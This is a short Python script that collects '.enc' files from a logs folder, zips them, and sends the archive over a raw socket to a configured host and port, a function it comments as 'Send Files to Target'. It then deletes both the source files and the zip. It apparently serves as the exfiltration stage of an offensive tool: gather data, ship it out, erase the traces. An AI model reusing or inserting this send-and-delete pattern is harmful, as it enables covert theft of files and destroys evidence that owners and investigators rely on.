import time
import socket
import os
import zipfile

SEPARATOR = "<SEPARATOR>"
BUFFER_SIZE = 4096 # send 4096 bytes each time step

# the ip address or hostname of the server, the receiver
host = "127.0.0.1"
port = 8444


##
## Delete files from list with full path
##
def delete_files(files):
    print(f"Files queued for deletion: {files}")
    if isinstance(files, list):
        for file in files:
            print(f"deleting files {file}")
            os.remove(file)
    elif isinstance(files, str):
        os.remove(files)

##
## Zip files from list with full path
##
def zip_files(files):
    # https://linuxhint.com/python_zip_file_directory/
    # Assign the name of the directory to zip
    

    if os.path.exists(path):
        print(f"{path} exists, Zipping!")

        # printing the list of all files to be zipped
        print('The following list of files will be zipped:')
        for fileName in files:
            print(fileName)
     
        # writing files to a zipfile
        zip_output = path + 'logs' +'.zip'
        zip_file = zipfile.ZipFile(zip_output, 'w', zipfile.ZIP_DEFLATED)
        with zip_file:
            # writing each file one by one
            for file in files:
                zip_file.write(file)
        zip_file.close
        return zip_output

##
## Return all file paths of the particular directory
##
def retrieve_file_paths(dirName):
 
  # setup file paths variable
  filePaths = []
  suffix = ".enc"
  # Read all directory, subdirectories and file lists
  for root, directories, files in os.walk(dirName):
    for filename in files:
        # Create the full filepath by using os module.
        if filename.endswith(suffix):
            filePath = os.path.join(root, filename)
            filePaths.append(filePath)
         
  # return all paths
  return filePaths

##
## Send Files to Target
##
def send_files(filename):
    filesize = os.path.getsize(filename)

    # create the client socket
    s = socket.socket()

    print(f"[+] Connecting to {host}:{port}")
    s.connect((host, port))


    # send the filename and filesize
    s.send(f"{filename}{SEPARATOR}{filesize}".encode())
    #added sleep to force program to use a different packet for the file send
    time.sleep(1)

    with open(filename, "rb") as f:
        while True:
            # read the bytes from the file
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                # file transmitting is done
                break
            # ensure transimission
            s.sendall(bytes_read)

    # close the socket
    s.close()

#make_directory()
path = 'C:\\temp\\logs\\'
files_to_use = retrieve_file_paths(path)

if len(files_to_use) > 0:
    file_to_send = zip_files(files_to_use)
    send_files(file_to_send)
    print("Deleting source Files")
    delete_files(files_to_use)
    print("Deleting zipped file")
    delete_files(file_to_send)

else:
    print("Nothing to send")
